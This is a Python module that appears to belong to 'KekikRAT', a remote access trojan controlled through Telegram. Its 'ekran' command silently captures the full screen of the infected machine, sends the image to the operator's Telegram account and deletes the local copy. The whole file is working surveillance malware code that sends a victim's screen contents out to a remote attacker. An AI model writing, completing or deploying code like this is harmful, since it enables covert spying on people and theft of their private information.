#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

from pyrogram import Client, Filters
from KekikRAT import adminID
from PIL import ImageGrab
import os

@Client.on_message(Filters.command(['ekran'], ['!','.','/']))
def ekran(client, message):
    message.reply_chat_action("typing")
    kekik = client.send_message(adminID, "Bekleyin..")

    mesaj = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | `ekran` Komutunu Verdi!\n\n"

    ekran = ImageGrab.grab()
    ekran.save('Sreenshot.png')

    client.send_photo(adminID, 'Sreenshot.png')

    os.remove('Sreenshot.png')

    kekik.edit(mesaj)